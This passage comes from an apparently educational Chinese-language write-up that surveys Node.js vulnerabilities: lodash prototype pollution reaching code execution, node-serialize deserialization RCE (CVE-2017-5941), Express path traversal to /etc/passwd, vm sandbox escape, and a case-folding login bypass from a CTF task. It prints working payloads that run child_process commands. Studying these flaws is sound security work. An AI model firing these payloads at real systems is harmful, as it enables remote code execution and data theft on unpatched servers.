    app.all('/', (req, res) => {
        // 定义session
        let data = req.session.data || {language: [], category: []}
        if (req.method == 'POST') {
            // 获取post数据并合并
            data = lodash.merge(data, req.body)
            req.session.data = data
            // 再将data赋值给session
        }
        res.render('index', {
            language: data.language, 
            category: data.category
        })
    })
    app.listen(3000, () => console.log('Example app listening on port 3000!'))
问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。
页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。
如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。
    var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。
继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：
    var result = attempt(function() {
        return Function(importsKeys, sourceURL + 'return ' + source)
          .apply(undefined, importsValues);
      });
通过构造chile_process.exec()就可以执行任意代码了。
最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：
    {"__proto__":{"sourceURL":"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"}}
(这里直接用require会报错：ReferenceError: require is not defined
p神给了一个更好的payload：
    {"__proto__":{"sourceURL":"\nreturn e=> {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')}\n//"}}
## node-serialize反序列化RCE漏洞(CVE-2017-5941)
漏洞出现在node-serialize模块0.0.4版本当中，使用`npm install node-serialize@0.0.4`安装模块。
  * 了解什么是IIFE：
[IIFE（立即调用函数表达式）](https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F)是一个在定义时就会立即执行的
JavaScript 函数。
IIFE一般写成下面的形式：
    (function(){ /* code */ }());
    // 或者
    (function(){ /* code */ })();
  * `node-serialize@0.0.4`漏洞点
漏洞代码位于node_modules\node-serialize\lib\serialize.js中：
其中的关键就是：`obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) +
')');`这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个`function(){}()`函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：
  * 构造Payload
    serialize = require('node-serialize');
    var test = {
     rce : function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});},
    }
    console.log("序列化生成的 Payload: \n" + serialize.serialize(test));
生成的Payload为：
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls
/',function(error, stdout, stderr){console.log(stdout)});}"}`
因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个`()`，结果如下：
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls
/',function(error, stdout, stderr){console.log(stdout)});}()"}`
(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)
传递给unserialize(注意转义单引号)：
    var serialize = require('node-serialize');
    var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr){console.log(stdout)});}()"}';
    serialize.unserialize(payload);
执行命令成功，结果如图：
## Node.js 目录穿越漏洞复现(CVE-2017-14849)
在vulhub上面可以直接下载到环境。
漏洞影响的版本：
  * Node.js 8.5.0 + Express 3.19.0-3.21.2
  * Node.js 8.5.0 + Express 4.11.0-4.15.5
运行漏洞环境：
    cd vulhub/node/CVE-2017-14849/
    docker-compose build
    docker-compose up -d
用Burpsuite获取地址：`/static/../../../a/../../../../etc/passwd`
即可下载得到`/etc/passwd`文件
具体分析可见：[Node.js CVE-2017-14849
漏洞分析](https://security.tencent.com/index.php/blog/msg/121)
## vm沙箱逃逸
vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：
逃逸例子：
    const vm = require("vm");
    const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`);
    console.log(env);
执行之后可以获取到主程序环境中的环境变量
上面例子的代码等价于如下代码：
    const vm = require('vm');
    const sandbox = {};
    const script = new vm.Script("this.constructor.constructor('return this.process.env')()");
    const context = vm.createContext(sandbox);
    env = script.runInContext(context);
    console.log(env);
创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。
因为`this.constructor.constructor`返回的是一个`Function
constructor`，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的)
这里构造的函数内的语句是`return this.process.env`，结果是返回了主程序的环境变量。
配合`chile_process.exec()`就可以执行任意命令了：
    const vm = require("vm");
    const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
    process.mainModule.require('child_process').execSync('whoami').toString()`);
    console.log(env);
最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。
具体分析可参考：[CVE-2019-10758:mongo-expressRCE复现分析](https://xz.aliyun.com/t/7056)
## javascript大小写特性
在javascript中有几个特殊的字符需要记录一下
对于toUpperCase():
    字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
对于toLowerCase():
    字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
在绕一些规则的时候就可以利用这几个特殊字符进行绕过
**CTF题实例 - Hacktm中的一道Nodejs题**
题目部分源码：
    function isValidUser(u) {
      return (
        u.username.length >= 3 &&
        u.username.toUpperCase() !== config.adminUsername.toUpperCase()
      );
    }
    function isAdmin(u) {
      return u.username.toLowerCase() == config.adminUsername.toLowerCase();
    }
解题时需要登录管理员的用户名，但是在登录时，`isValidUser`函数会对用户输入的用户名进行`toUpperCase`处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。
但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是`toLowerCase`。所以这两个差异，就可以使用大小写特性来进行绕过。
题目中默认的管理员用户名为：hacktm
所以，我们指定登录时的用户名为：hacKtm 即可绕过`isValidUser`和`isAdmin`的验证。
题目完整Writeup:[HackTM中一道Node.js题分析(Draw with us)](https://xz.aliyun.com/t/7177)
## 说在最后
最近才刚开始学习Node.js，打算趁寒假这段时间把常见的几个漏洞总结一下。如果文章中出现了错误，还希望师傅们能够直接指出来，十分感谢！
## 参考
  * [浅谈Node.js Web的安全问题](https://www.freebuf.com/articles/web/152891.html)
  * [深入理解JavaScript Prototype污染攻击](https://www.freebuf.com/articles/web/200406.html)
  * [利用 Node.js 反序列化漏洞远程执行代码](https://paper.seebug.org/213/)
  * [Sandboxing NodeJS is hard, here is why](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)
  * 
  * [Fuzz中的javascript大小写特性](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)